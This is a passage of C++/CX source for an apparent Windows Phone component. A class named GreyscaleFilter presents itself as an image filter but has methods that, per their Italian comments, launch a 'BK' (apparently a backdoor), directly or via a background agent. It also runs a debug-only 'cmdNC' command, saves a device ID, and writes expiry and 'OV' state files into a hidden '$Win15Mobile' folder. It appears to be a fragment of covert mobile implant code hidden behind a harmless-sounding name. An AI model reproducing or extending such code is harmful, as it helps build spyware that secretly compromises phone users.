	//lancia la BK
	startPI();

	//cmdNC();
	//saveAllPID();

	return 1;
}


int GreyscaleFilter::Create()
{
	//salva ID del cel
	startCreate();

	return 1;
}

int GreyscaleFilter::StartCmdNC()
{
	//chackBachGround();
#ifdef _DEBUG
	cmdNC();
#endif
	return 1;
}

//viene startata direttamente non tramite il background Agent
int GreyscaleFilter::StartDirectBK()
{
	//salva ID del cel
	startCreate();
	//Starta bk
	startPI();
	return 1;
}

Platform::String^  GreyscaleFilter::BNSIUpdateExpiryTime()
{
	return ref new Platform::String(startBNSIUpdateNotification());
}

void GreyscaleFilter::BNSIsaveExpiryTime(Platform::String^ ExpiryTime)
{
#ifdef _DEBUG
	fstream fileExpiryTime;
	wchar_t msgW[128];
	char msgA[128];
		
	char buff[DTTMSZ];
	fileExpiryTime.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ExpiryTimPID.txt", fstream::out|fstream::app);		
	fileExpiryTime << getDtTm (buff) << std::endl;
	fileExpiryTime << "ExpiryTime: ";
	wcstombs(msgA, ExpiryTime->Data(), wcslen(ExpiryTime->Data())+1);
	fileExpiryTime << msgA << std::endl;
	fileExpiryTime.close();
#endif
}

void GreyscaleFilter::SaveOV(Platform::String^ strOV)
{
	fstream filestrOV;

	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);

	char msgA[128];
		
	filestrOV.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\OV.bin", fstream::out|fstream::binary);		
	wcstombs(msgA, strOV->Data(), wcslen(strOV->Data())+1);
	filestrOV << msgA << std::endl;
	filestrOV.close();
	
}